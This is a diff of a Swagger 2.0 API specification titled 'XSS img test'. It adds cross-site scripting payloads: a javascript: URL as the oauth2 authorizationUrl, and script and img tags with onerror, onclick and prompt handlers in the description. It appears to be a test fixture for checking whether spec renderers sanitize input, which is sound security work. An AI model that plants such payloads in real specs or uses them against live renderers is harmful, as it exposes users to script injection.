@@ -1,7 +1,12 @@
 swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: javascript:alert(document.domain)//
 info:
-  title: XSS test
-  description: |
+  version: "1.0.0"
+  title: XSS img test
+  description: <script> onload = alert('1') </script> <img src=https://pbs.twimg.com/profile_images/1489293302541303816/J6VoQDMY_400x400.jpg onclick="alert(2)" onerror="alert(3)">
   
 <image src/onerror=prompt(8)>
 <img src/onerror=prompt(8)>
